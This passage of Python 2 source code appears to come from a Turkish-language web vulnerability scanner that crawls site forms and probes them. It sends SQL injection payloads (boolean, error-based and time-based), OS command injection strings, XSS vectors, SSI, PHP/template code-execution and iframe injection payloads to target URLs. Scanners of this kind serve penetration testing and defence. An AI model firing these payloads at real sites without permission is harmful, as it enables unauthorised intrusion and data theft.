                                        a="[#] Login Sayfasi tespit Edildi "+formurl
                                        
                                    #print post_input['name']
                                    if post_input.has_key('value'):
                                        toplamveri[post_input['name']]=post_input['value']
                                    else:
                                        toplamveri[post_input['name']]=""
    
                        else: 
                            if post_input.has_key('value'):
                                toplamveri[post_input['name']]=post_input['value']
                            else:
                                toplamveri[post_input['name']]=""
    
                    for key in toplamveri.keys():
                        if re.search("[\w\d]*mail[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="sifiriksdoksandort@hotmail.com"
                        if re.search("[\w\d]*name[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="Danniel Leonardocu"	
                        if re.search("[\w\d]*date[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="02/08/2017"	
                        if re.search("[\w\d]*birth[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="09/01/1987"	
                        if re.search("[\w\d]*city[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="Washington"	
                        if re.search("[\w\d]*state[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="California"	
                        if re.search("[\w\d]*county[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="America"
                        if re.search("[\w\d]*postal[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="93106"		
                        if re.search("[\w\d]*tel[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="05123456789"	
                        if re.search("[\w\d]*tel[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="05123456789"	
                        if re.search("[\w\d]*url[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="http://www.google.com"	
                        if re.search("[\w\d]*site[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="http://www.google.com"			
    
                    postyeah=""
                    for key in toplamveri.iterkeys():
                        postyeah+=key
                    if postlarisuz.has_key(postyeah):
                        mesaj="var"
                    else:
                        postlarisuz[postyeah]="0x94"
                        
                        self.tetikle(formurl, toplamveri,"POST")
                                                
    
                if form.has_key('method') and form['method'].lower() == 'get' or not form.has_key('method'):
                    #print "[GET] action " +formurl
                    for get_inputselect in form.findAll("select"):
                        if get_inputselect.has_key("name"):
                            #print get_inputselect['name']
                            toplamveri[get_inputselect['name']]=""
    
    
                    for get_input in form.findAll("input"):
                        if get_input.has_key('type'):
                            if get_input['type'].lower() == 'text' or get_input['type'].lower() == 'password' or get_input['type'].lower() == 'hidden' or get_input['type'].lower() == 'radio':
                                if get_input.has_key('id'):
                                    #print get_input['id']
                                    if "user" in get_input['id'] or \
                               "username" in get_input['id'] or \
                       "password" in get_input['id'] or \
                       "pass" in get_input['id']:
                                        a="[#] Login Sayfasi tespit Edildi "+formurl
    
                                    if post_input.has_key('value'):
                                        toplamveri[post_input['id']]=post_input['value']
                                    else:
                                        toplamveri[post_input['id']]=""
                                    toplamveri[post_input['id']]=""
                                elif get_input.has_key('name'):
                                    #print get_input['name']
                                    if "user" in get_input['name'] or \
                               "username" in get_input['name'] or \
                       "password" in get_input['name'] or \
                       "pass" in get_input['name']:
                                        a="login"
                                    if get_input.has_key('value'):
                                        toplamveri[get_input['name']]=get_input['value']
                                    else:
                                        toplamveri[get_input['name']]=""
    
                        else: 
                            if get_input.has_key('value'):
                                toplamveri[get_input['name']]=get_input['value']
                            else:
                                toplamveri[get_input['name']]=""
    
    
                    for key in toplamveri.keys():
                        if re.search("[\w\d]*mail[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="sifiriksdoksandort@hotmail.com"
                        if re.search("[\w\d]*name[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="Danniel Leonardocu"	
                        if re.search("[\w\d]*date[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="02/03/2013"	
                        if re.search("[\w\d]*birth[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="09/01/1987"	
                        if re.search("[\w\d]*city[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="Washington"	
                        if re.search("[\w\d]*state[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="California"	
                        if re.search("[\w\d]*county[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="America"
                        if re.search("[\w\d]*postal[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="93106"		
                        if re.search("[\w\d]*tel[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="05123456789"	
                        if re.search("[\w\d]*tel[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="05123456789"	
                        if re.search("[\w\d]*url[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="http://www.google.com"	
                        if re.search("[\w\d]*site[\w\d]*",key,re.DOTALL):
                            toplamveri[key]="http://www.google.com"	
    
                    postyeah=""
                    for key in toplamveri.iterkeys():
                        postyeah+=key
                    if postlarisuz.has_key(postyeah):
                        mesaj="var"
                    else:
                        postlarisuz[postyeah]="0x94"
                        self.tetikle(formurl, toplamveri,"GET")
             
                    
        except urllib2.HTTPError,  e:
            mesaj="hata"
    
        except urllib2.URLError,  e:
            mesaj="Hata olustu"
            #yaz(mesaj)
        except:
            mesaj="Bilinmeyen hata olustu\n"
            #yaz(mesaj)
            
    

    def postget(self,url, params, method):
    
    
    
        postgetdict={}
        postgetdict=params.copy()
    
    
        try:
            for key,value in params.items():
                if key in postgetdict:
                    postgetdict[key]=value+"'"
    
            parametre = urllib.urlencode(postgetdict)
            if method=="GET":
                f = urllib.urlopen(url+"?"+parametre)
                
            else:
                f = urllib2.urlopen(url, parametre)
            self.hatakontrol("GET",url,f.read(),"")
            
        except urllib2.HTTPError,  e:
            if(e.code==302):
                self.hatakontrol("GET",url,e.read(),url+" SQL INJECTION")
            
                    
            if(e.code==500):
                self.hatakontrol("GET",url,e.read(),url)
              
    
        except urllib2.URLError,  e:
            mesaj="ggggu"
        except:
            mesaj="fff"
     
     
    def postgettek(self,url, params, method):
    
        postgetdict={}
        postgetdict=params.copy()
    
    
    
        for key,value in params.items():
            try:
                if key in postgetdict:
                    postgetdict[key]=value+"'"
    
                    parametre = urllib.urlencode(postgetdict)
                    if method=="GET":
                        f = urllib.urlopen(url+"?"+parametre)
                    else:
                        f = urllib2.urlopen(url, parametre)
                        
                    self.hatakontrol(method,url,f.read(),"xxxx")
                    postgetdict.clear()
                    postgetdict=params.copy()
            except urllib2.HTTPError,  e:
                if(e.code==302):
                    self.hatakontrol(method,url,e.read(),url+" SQL INJECTION")
                if(e.code==500):
                    self.hatakontrol(method,url,e.read(),url)                    
                    postgetdict.clear()
                    postgetdict=params.copy()
            except urllib2.URLError,  e:
                postgetdict.clear()
                postgetdict=params.copy()
                mesaj="ggggu"
            except:
                mesaj="fff"
            
       
       
       
    def blindpost(self,url,params,method):
    
    
        try:
            normaldict={}
            for key,value in params.items():
                if value=="":
                    value="0x94"
                normaldict[key]=value+"0x94"
    
            parametresaf = urllib.urlencode(normaldict)
            if method=="GET":
                normalkaynak = self.temizle(urllib.urlopen(url+"?"+parametresaf).read())
            else:
                normalkaynak = self.temizle(urllib2.urlopen(url, parametresaf).read())
    
        except urllib2.HTTPError,  e:
            if(e.code==500):
                a="[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error "+url+"\n Yollanan Data ="+parametresaf,True,url+"blind"
    
        except urllib2.URLError,  e:
            mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
                    ##yaz(mesaj)
        except:
            mesaj="Bilinmeyen hata olustu\n"
    
    
        post_string	= [" 'aNd 1=1",
                             "' anD 1=1",
                            "' and 1=(select 1)+'",
                            "'+(SELECT 1)+'",
                              "'+(SELECT 999999)+'",
                                "' OR 'bk'='bk",
                                "0x94' AND 'a'='a",
                                "' select dbms_xmlgen.getxml('select \"a\" from sys.dual') from sys.dual;",
                                "' select+dbms_pipe.receive_message((chr(95)||chr(96)||chr(97))+from+dual)",
                                " SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",
                                "' SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",
                                "' or''='",
                                "0x94 'or''='",
                                "' and 1=1",
                                "' and 1=1 'a'='a",
                                "' and 1=1 'a'='a",
                                "' aNd 1=2",
                                "' aNd 1=MID((database()),1,1)>1",
                                "' aNd 2=MID((@@version,1,1)--+",
                                "' aNd 3=MID((@@version,1,1)--+",
                                "' aNd 4=MID((@@version,1,1)--+",
                                "' aNd 5=MID((@@version,1,1)--+",
                                "' or 1=1 --",
                                "a' or 1=1 --",
                                "' or 1=1 #",
                                "or 1=1 --",
                                "') or ('x'='x",
                                "or username LIKE '%a%",
                                "' or username LIKE '%a%",
                                "' HAVING 1=1--",
                                "' and+1=convert(int,@@version)",
                                "' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--",
                                "'a' || 'b' ",
                                "' SELECT IF(1=1,'true','false')",
                                "') or ('1'='1--",
                                "' GROUP BY 99999",
                                "if(true=false,1,SLEEP(5))--+",
                                "and+if(true%21=true,1,SLEEP(5))--+",
                                "and+if(1=2,1,SLEEP(5))--+",
                                "if(1%21=1,1,SLEEP(5))--+",
                                "if(true=true,1,SLEEP(5))--+",
                                "if(2=2,1,SLEEP(5))--+",
                                "and+true=false--+",
                                "and+false%21=false--+",
                                "and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
                                "union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+",
                                "' if(true=false,1,SLEEP(5))--+",
                                "' and+if(true%21=true,1,SLEEP(5))--+",
                                "' and+if(1=2,1,SLEEP(5))--+",
                                "' if(1%21=1,1,SLEEP(5))--+",
                                "' if(true=true,1,SLEEP(5))--+",
                                "' if(2=2,1,SLEEP(5))--+",
                                "' and+true=false--+",
                                "' and+false%21=false--+",
                                "' and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
                                "' union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+"]
    
        bitiskarakter=[""]
    
    
        #true_strings=["' OR 'bk'='bk"]
        #false_strings=["' OR 'bk'='bk1111"]
    
        true_strings = ["' or 1=1",
                       "')'a'='a'",
                      "')'a'='a",
                      "'or 'a'='a'",
                        "0x94' AND 'a'='a",
                        "' OR 'bk'='bk",
                        "' and 1=(select 1)+'",
                        "' aNd 1=1",
                        " and 1=1",
                        " ' and 1=1",
                        " and 'a'='a",
                        "' and 'a'='a",
                        "' and 'a'='a",
                        " and 1 like 1",
                        " and 1 like 1",
                        " and 1=1--",
                        " group by 1",
                        "'+(SELECT 1)+'",
                        "' and 1=(select 1)+'",
                        "'+aNd+10>1"]
    
        false_strings =["' or 1=2",
                       "')'a'='b'",
                      "')'a'='b",
                      "'or 'a'='b'",
                        "0x94' AND 'a'='b",
                        "' OR 'bk'='0x94",
                        "' and 1=(select 999999)+'",
                        "' aNd 1=2",
                        " and 1=2",
                        " ' and 1=2",
                        " and 'a'='b",
                        "' and 'a'='b",
                        "' and 'a'='b",
                        " and 1 like 2",
                        " and 1 like 2",
                        " and 1=2--",
                        " group by 99999",
                        "'+(SELECT 99999)+'",
                        "' and 1=(select 2)+'",
                        "'+aNd+10>20"]
    
    
        for sonkarakter in bitiskarakter:
    
    
            for iyy in range(len(true_strings)):
    
                normaldict={}
                truedict={}
                falsedict={}
                normaldict=params.copy()
                truedict=params.copy()
                falsedict=params.copy()
    
                
    
    
                for key,value in params.items():
                    if key not in ignoreparametre:
                        normalkaynak=""
                        if key in normaldict:
                            if value=="":
                                value="0x94"
                            normaldict[key]=value+sonkarakter
                            try:
                                
                                parametresafn = urllib.urlencode(normaldict)
                                if method=="GET":
                                    normalkaynak = self.temizle(urllib.urlopen(url+"?"+parametresafn).read())
                                    
                                    normaldict.clear()
                                    normaldict=params.copy()
                                else:
                                    
                                    normalkaynak = self.temizle(urllib2.urlopen(url, parametresafn).read())
                                    normaldict.clear()
                                    normaldict=params.copy()
    
                            except urllib2.HTTPError,  e:
                                if(e.code==302):
                                    mself.hatakontrol(method,url,normalkaynak.read(),url+" BLIND")
                                        
                                elif(e.code==500):
                                    self.hatakontrol(method,url,e.read(),url)
                                        
                                elif(e.code==404):
                                    normalyok=True
    
                            except urllib2.URLError,  e:
                                mesaj="yyyy"
                                        #yaz(mesaj)
                            except:
                                mesaj="afaf"
                    #-----------------------------------------------------------------------------------
                        if key in truedict:
                            if value=="":
                                value="0x94"
                            truedict[key]=value+true_strings[iyy]+sonkarakter
                            try:
                                parametresaft = urllib.urlencode(truedict)
                                if method=="GET":
                                    truekaynak = self.temizle(urllib.urlopen(url+"?"+parametresaft).read())
                                    truedict.clear()
                                    truedict=params.copy()
                                else:
                                    truekaynak = self.temizle(urllib2.urlopen(url, parametresaft).read())
                                    truedict.clear()
                                    truedict=params.copy()
                                self.hatakontrol(method,url,truekaynak,method+" "+url)
                                    
                        
    
    
                            except urllib2.HTTPError,  e:
                                if(e.code==302):
                                    self.hatakontrol(method,url,e.read(),url+" BLIND")
                                elif(e.code==500):
                                    self.hatakontrol(method,url,e.read(),url)
                                    
    
                            except urllib2.URLError,  e:
                                mesaj="hhh"
                            except:
                                mesaj="fffn"
    
    
                        if key in falsedict:
    
                            if value=="":
                                value="0x94"
                            falsedict[key]=value+false_strings[iyy]+sonkarakter
                            try:
                                parametresaff = urllib.urlencode(falsedict)
                                if method=="GET":
                                    falsekaynak = self.temizle(urllib.urlopen(url+"?"+parametresaff).read())
    
                                    falsedict.clear()
                                    falsedict=params.copy()
                                else:
                                    falsekaynak = self.temizle(urllib2.urlopen(url, parametresaff).read())
                                    falsedict.clear()
                                    falsedict=params.copy()
    
                                self.hatakontrol(method,url,falsekaynak,method+" SQL INJECTION "+url+"\n Yollanan Veri="+parametresaff)
#xxxxxxxxxxxxx                                
    
    
    
                            except urllib2.HTTPError,  e:
                                if(e.code==302):
                                    self.hatakontrol(method,url,e.read(),url+" BLIND")
                                elif(e.code==500):
                                    self.hatakontrol(method,url,e.read(),url)
    
                            except urllib2.URLError,  e:
                                mesaj="ggg"
                                        #yaz(mesaj)
                            except:
                                mesaj="jjjj"
                            #if (comparePages(truekaynak,normalkaynak,url," BLIND ") > comparePages(truekaynak,falsekaynak,url," BLIND ")):
    
                            if normalkaynak==falsekaynak:
                                if truekaynak!=falsekaynak:
                                    if len(truekaynak)!=len(falsekaynak):
                                        if normalyok==False:
                                            self.comparePages(truekaynak,falsekaynak,url,"\n\n [#]  POST SQL INJECTION \n\n TRUE Yollanan Veri="+parametresaft+"\n\n FALSE Yollanan Veri="+parametresaff)
                                            self.blindpostonay(url,params,method)
                                    #comparePages(truekaynak,falsekaynak,url,"\n\n [#]  POST SQL INJECTION BULUNDU URL = "+url+" \n\n TRUE Yollanan Veri="+parametresaft+"\n\n FALSE Yollanan Veri="+parametresaff)
                                    debug=1
                                #comparePages(y1kaynak,y2kaynak,url,"[#] BLind "+method+" Sayfada Degisiklik oldu  !!![+]"+url+"\nYollanan Veri ="+false_strings[iyy]+sonkarakter+"\n")
    
     
         
    def blindpostonay(self,url,params,method):
    
    
    
        timesql=[" WAITFOR DELAY '0:0:25';--",
                "'+(SELECT 1 FROM (SELECT SLEEP(25))A)+'",
               "(SELECT 1 FROM (SELECT SLEEP(25))A)",
               "1') AND SLEEP(25) AND ('LoUL'='LoUL",
                 "' WAITFOR DELAY '0:0:25' and 'a'='a;--",
                 "' and  sleep(25) and  'a'='a",
                 "' WAITFOR DELAY '0:0:25';--",
                 "' IF 1=1 THEN dbms_lock.sleep(25);",
                 " ' IF 1=1 THEN dbms_lock.sleep(25);",
                 " ' WAITFOR DELAY '0:0:25';--",
                 "; SLEEP(25)",
                 " SLEEP(25)",
                 "' SLEEP(25)--",
                 "' SLEEP(25)",
                 " pg_sleep(25)",
                 " ' pg_sleep(25)",
                 " PG_DELAY(25)",
                 " ' PG_DELAY(25)",
                 " and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--",
                 " ' and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--",
                 " DBMS_LOCK.SLEEP(25);",
                 " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:25'--",
                 "1,'0');waitfor delay '0:0:25;--",
                 "');waitfor delay'0:0:25';--",
                 ");waitfor delay '0:0:25';--",
                 "' and pg_sleep(25)--",
                 "1) and pg_sleep(25)--",
                 "\") and pg_sleep(25)--",
                 "') and pg_sleep(25)--",
                 "1)) and pg_sleep(25)--",
                 ")) and pg_sleep(25)--",
                 "')) and pg_sleep(25)--",
                 "\")) or pg_sleep(25)--",
                 "')) or pg_sleep(25)--",
                 "' and pg_sleep(25)--",
                 "1) and sleep(25)--",
                 "\") and sleep(25)--",
                 "') and sleep(25)--",
                  "1)) and sleep(25)--",
                 ")) and sleep(25)--",
                 "')) and sleep(25)--",
                 "\")) or sleep(25)--",
                 "' or pg_sleep(25)--",
                 "')) or sleep(25)--",
                 "1' or (sleep(19)+1) limit 1 -- ",
                 "';WAITFOR DELAY '0:0:25'--",
                 "1;WAITFOR DELAY '0:0:25'--",
                 "WAITFOR DELAY '0:0:25'--",
                 "1);WAITFOR DELAY '0:0:25'--",
                 "');WAITFOR DELAY '0:0:25'--",
                  "'));WAITFOR DELAY '0:0:25'--",
                  "1));WAITFOR DELAY '0:0:25'--",
                  "-1 AND (SELECT 1 FROM (SELECT 2)a WHERE 1=sleep(25))-- 1",
                  "(select sleep(25))a--",
                  "(select dbms_pipe.receive_message((chr(48)||chr(120)||chr(57)||chr(52)),20) from dual)",
                  "1' || (select dbms_pipe.receive_message((chr(48)||chr(120)||chr(57)||chr(52)),20) from dual) || '",
                  "';SELECT pg_sleep(25)--",
                  "1;SELECT pg_sleep(25)--",
                  "SELECT pg_sleep(25)--",
                  "1);SELECT pg_sleep(25)--",
                  "');SELECT pg_sleep(25)--",
                  "'));SELECT pg_sleep(25)--",
                  "1));SELECT pg_sleep(25)--",
                  "1 + (select dbms_pipe.receive_message((chr(48)||chr(120)||chr(57)||chr(52)),20) from dual) + 1",
                  "(SELECT 1 FROM (SELECT SLEEP(25))A)",
                  "'+(SELECT 1 FROM (SELECT SLEEP(25))A)+'",
                  "-1' or 1=(SELECT 1 FROM (SELECT SLEEP(25))A)+'",
                  "'%2b(select*from(select(sleep(25)))a)%2b'",
                  "-1\" or 1=(SELECT 1 FROM (SELECT SLEEP(25))A)+\""]
    
    
        postgetdict={}
        postgetdict=params.copy()
    
        for timeler in timesql:
    
            for key,value in params.items():
                if key in postgetdict:
                    postgetdict[key]=value+timeler
                    try:
                        parametresaf = urllib.urlencode(postgetdict)
                        if method=="GET":
                            y11 = urllib2.urlopen(url+"?"+parametresaf,timeout=15).read()
                            postgetdict.clear()
                            postgetdict=params.copy()
    
                        else:
                            y11 = urllib2.urlopen(url, parametresaf,timeout=15).read()
                            
                            postgetdict.clear()
                            postgetdict=params.copy()
                        self.hatakontrol(method,url,y11,"")
    
    
    
                    except urllib2.HTTPError,e:
                        if(e.code==302):
                            self.hatakontrol(method,url,e.read(),url+" BLIND POST")
                                        
                                
                        postgetdict.clear()
                        postgetdict=params.copy()
                        if(e.code==500):
                            self.hatakontrol(method,url,e.read(),url)
                            
                    except socket.timeout:
                        self.ekle(method,url,"Timebased SQL Injection",url+parametresaf, "Timeout")
    
                    except urllib2.URLError,  e:
                        postgetdict.clear()
                        postgetdict=params.copy()
                        if "Time" in e.reason:
                            mesaj="Time BASED SQL Olabilir Cunku Cok bekledi =  %s , %s \n" %(url,timeler)
                            self.ekle(method,url,"Timebased SQL Injection",url+parametresaf, "Timeout")
                        
                            
                    except:
                        mesaj="dddd"
    
    
    
    
    def comandinj(self,url,params,method):
    
    
    
    
        seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";"]
    
        command=["SET /A 0xFFF123-2","expr 12345671 - 2","SET APPDATA"]
    
        postgetdict={}
        postgetdict=params.copy()
    
        for sep in seperators:
            for pcmd in command:
                for key,value in params.items():
                    if key in postgetdict:
                        postgetdict[key]=value+sep+pcmd
                        try:
                            parametresaf = urllib.urlencode(postgetdict)
                            if method=="GET":
                                y11 = urllib.urlopen(url+"?"+parametresaf,timeout=20).read()
                                postgetdict.clear()
                                postgetdict=params.copy()
    
                            else:
                                y11 = urllib2.urlopen(url, parametresaf,timeout=20).read()
                                postgetdict.clear()
                                postgetdict=params.copy()
    
                            if "12345669" in y11 or "16773409" in y11 or "Roaming" in y11 :
                                self.ekle(method,url,"Command injection",parametresaf, y11)
                                
    
    
                        except urllib2.HTTPError,e:
                            if "12345669" in e.read() or "16773409" in e.read() :
                                self.ekle(method,url,"Command injection",parametresaf, e.read())
     		    
    
                        except urllib2.URLError,  e:
                            if "Time" in e.reason:
                                mesaj="Cok bekledi =  %s , %s \n" %(url,"ping localhost")
                        except:
                            mesaj="ddd"


    def postXSS(self,url,params,method):
    
        
        xsspayload=["\"><script>alert(0x000123)</script>",
                   "\"><sCriPt>alert(0x000123)</sCriPt>",
                  "\"; alert(0x000123)",
                  "\"></sCriPt><sCriPt>alert(0x000123)</sCriPt>",
                    "\"><img Src=0x94 onerror=alert(0x000123)>",
                "\"><BODY ONLOAD=alert(0x000123)>",
                "'%2Balert(0x000123)%2B'",
                "\"><0x000123>",
                "'+alert(0x000123)+'",
                "%2Balert(0x000123)%2B'",
                "'\"--></style></script><script>alert(0x000123)</script>",
                "'</style></script><script>alert(0x000123)</script>",
                "</script><script>alert(0x000123)</script>",
                "</style></script><script>alert(0x000123)</script>",
                "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C",
                "'\"--></style></script><script>alert(0x000123)</script>",
                "';alert(0x000123)'",
                "<scr<script>ipt>alert(0x000123)</script>",
                "<scr<script>ipt>alert(0x000123)</scr</script>ipt>",
                "\"<scr<script>ipt>alert(0x000123)</scr</script>ipt>",
                "\"><scr<script>ipt>alert(0x000123)</script>",
                "\">'</style></script><script>alert(0x000123)</script>",
                "\"></script><script>alert(0x000123)</script>",
                "\"></style></script><script>alert(0x000123)</script>",
                "');alert(0x000123)//"]
    
    
        postgetdict={}
        postgetdict=params.copy()
    
        for xssler in xsspayload:
    
            for key,value in params.items():
                if key in postgetdict:
                    postgetdict={}
                    postgetdict[key]=value+xssler
                    try:
                        parametresaf = urllib.urlencode(postgetdict)
                        if method=="GET":
                            xsspostresponse = urllib.urlopen(url+"?"+parametresaf).read()
                            postgetdict.clear()
                            postgetdict=params.copy()
    
                        else:
                            xsspostresponse = urllib2.urlopen(url, parametresaf).read()
                            postgetdict.clear()
                            postgetdict=params.copy()
    
                        if "<script>alert(0x000123)" in xsspostresponse or \
                      "');alert(0x000123)" in xsspostresponse or \
                 "<sCriPt>alert(0x000123)" in xsspostresponse or \
                 "+alert(0x000123)+" in xsspostresponse or \
                           "'%2Balert(0x000123)%2B'" in xsspostresponse or \
                           "<BODY ONLOAD=alert(0x000123)>" in xsspostresponse or \
                           "<img Src=0x94 onerror=alert(0x000123)" in xsspostresponse:
                            xssmi=self.xsscalisiomu(xsspostresponse)
                            if xssmi==False:
                                self.ekle(method,url,"XSS",parametresaf, xsspostresponse)
    
    
    
                    except urllib2.HTTPError,e:
                        if "<script>alert(0x000123)" in e.read() or \
                      "');alert(0x000123)" in e.read() or \
                 "<sCriPt>alert(0x000123)" in e.read() or \
                 "+alert(0x000123)+" in e.read() or \
                           "'%2Balert(0x000123)%2B'" in e.read() or \
                        "<BODY ONLOAD=alert(0x000123)>" in e.read() or \
                        "<img Src=0x94 onerror=alert(0x000123)" in e.read():		    
                            xssmi=self.xsscalisiomu(e.read())
                            if xssmi==False:
                                self.ekle(method,url,"XSS",parametresaf, e.read())
    
                        postgetdict.clear()
                        postgetdict=params.copy()
                        if(e.code==302):
                            self.hatakontrol(url,e.read(),url+" XSS")
                        if(e.code==500):
                            a="500"
    
    
                    except urllib2.URLError,e:
                        postgetdict.clear()
                        postgetdict=params.copy()
                        mesaj="dddu"
                    except:
                        mesaj="dd"
                        
                                                
                        
    def ssikontrol(self,url,params,method):
    
        kodum="<!--#printenv -->"
        postgetdict={}
        postgetdict=params.copy() 
        for key,value in params.items():
            if key in postgetdict:
                postgetdict[key]=value+kodum
    
        try:
            parametresaf = urllib.urlencode(postgetdict)
            if method=="GET":
                ssisource = urllib.urlopen(url+"?"+parametresaf).read()
            else:
                ssisource = urllib2.urlopen(url, parametresaf).read()
    
            if "REMOTE_ADDR" in ssisource  and \
             "DATE_LOCAL" in ssisource and \
           "DATE_GMT" in ssisource and \
           "DOCUMENT_URI" in ssisource and \
               "LAST_MODIFIED" in ssisource:
                self.ekle(method,url,"SSI Injection",parametresaf, ssisource)
    
    
        except urllib2.HTTPError,e:
            if "REMOTE_ADDR" in e.read()  and \
             "DATE_LOCAL" in e.read() and \
           "DATE_GMT" in e.read() and \
           "DOCUMENT_URI" in e.read() and \
               "LAST_MODIFIED" in e.read():
                self.ekle(method,url,"SSI Injection",parametresaf, e.read())
                
        
    
        except urllib2.URLError,  e:
            mesaj="ffi"
    
    
        except:
            mesaj="fff"
            #yaz(mesaj)


    def blindcommand(self,url,params,method):
    

    
        seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";"]
    
    
        blindcmd=["ping -n 50 127.0.0.1","ping -c 50 127.0.0.1"]
    
        postgetdict={}
        postgetdict=params.copy()
    
    
        for sep in seperators:
            for asilblind in blindcmd:
                for key,value in params.items():
                    if key in postgetdict:
                        postgetdict[key]=value+sep+asilblind
    
                try:
                    parametresaf = urllib.urlencode(postgetdict)
                    if method=="GET":
                        blindcmdsource = urllib2.urlopen(url+"?"+parametresaf,timeout=29).read()
                        postgetdict.clear()
                        postgetdict=params.copy()
                    else:
                        blindcmdsource = urllib2.urlopen(url, parametresaf,timeout=20).read()
                        postgetdict.clear()
                        postgetdict=params.copy()
    
                except urllib2.HTTPError,e:
                    postgetdict.clear()
                    postgetdict=params.copy()
                    
    
                except urllib2.URLError,  e:
                    postgetdict.clear()
                    postgetdict=params.copy()
                    #print ""
    
                except socket.timeout:
                    self.ekle(method,url,"Blind Command Injection",parametresaf, "ping -c 50 Timeout ")
                
    
                except:
                    mesaj="Bfafag"
                    #yaz(mesaj)
                    
                    
    def postrce(self,url,params,method):
    

    
        rceler = ["#print(int)0xFFF123-1",
                 "+#print(int)0xFFF123-1;//",
                "'+#print(int)0xFFF123-1+'",
                "\"+#print(int)0xFFF123-1+",
                  "<? #print(int)0xFFF123-1;//?>",
                "<? #print(int)0xFFF123-1;?>",
                "<?php #print(int)0xFFF123-1;?>",
                "{php}#print(int)0xFFF123-1;{/php}",
                "'{${#print(int)0xFFF123-1}}'",
               "[php]#print(int)0xFFF123-1;[/php]",
               "#print 0xFFF123-1",
                "eval('#print 0xFFF123-1')",
                "'+#print 0xFFF123-1+'",
                "\"+#print 0xFFF123-1+",
                "${@#print(0xFFF123-1);}"]
    
        postgetdict={}
        postgetdict=params.copy()
    
        for rcefull in rceler:
            for key,value in params.items():
                if key in postgetdict:
                    postgetdict={}
                    postgetdict[key]=value+rcefull
                    try:
                        parametresaf = urllib.urlencode(postgetdict)
                        if method=="GET":
                            y11 = urllib2.urlopen(url+"?"+parametresaf).read()
                            postgetdict.clear()
                            postgetdict=params.copy()
                            if "167734101" in y11:
                                self.ekle(method,url,"Remote Command Injection",parametresaf, y11)
                                                                
    
                        else:
                            y11 = urllib2.urlopen(url, parametresaf).read()
                            postgetdict.clear()
                            postgetdict=params.copy()
                            if "167734101" in y11:
                                self.ekle(method,url,"Remote Command Injection",parametresaf, y11)
                                    
    
    
                    except urllib2.HTTPError,e:
                        if "167734101" in e.read():
                            self.ekle(method,url,"Remote Command Injection",parametresaf, e.read())
                        postgetdict.clear()
                        postgetdict=params.copy()
                        
    
                    except urllib2.URLError,  e:
                        postgetdict.clear()
                        postgetdict=params.copy()
    
                    except:
                        mesaj="eee"
                        #yaz(mesaj)
                        
    def frameinjection(self,url,params,method):
    


    
        frameler = ["<iframe src=https://github.com/antichown/0x94scanner/blob/master/README.md></iframe>",
                   "\"><iframe src=https://github.com/antichown/0x94scanner/blob/master/README.md></iframe>",
                  "'<iframe src=https://github.com/antichown/0x94scanner/blob/master/README.md></iframe>'"]
    
        postgetdict={}
        postgetdict=params.copy()
    
        for framefull in frameler:
            for key,value in params.items():
                if key in postgetdict:
                    postgetdict={}
                    postgetdict[key]=value+framefull
                    try:
                        parametresaf = urllib.urlencode(postgetdict)
                        if method=="GET":
                            y11 = urllib2.urlopen(url+"?"+parametresaf).read()
                            postgetdict.clear()
                            postgetdict=params.copy()
                            if "readme.md" in y11.lower():
                                if "readme.md%3E%3C%2Fiframe%3E" not in y11.lower():
                                    self.ekle(method,url,"Frame Injection",parametresaf, y11)
                                
    
    
                        else:
                            y11 = urllib2.urlopen(url, parametresaf).read()
                            postgetdict.clear()
                            postgetdict=params.copy()
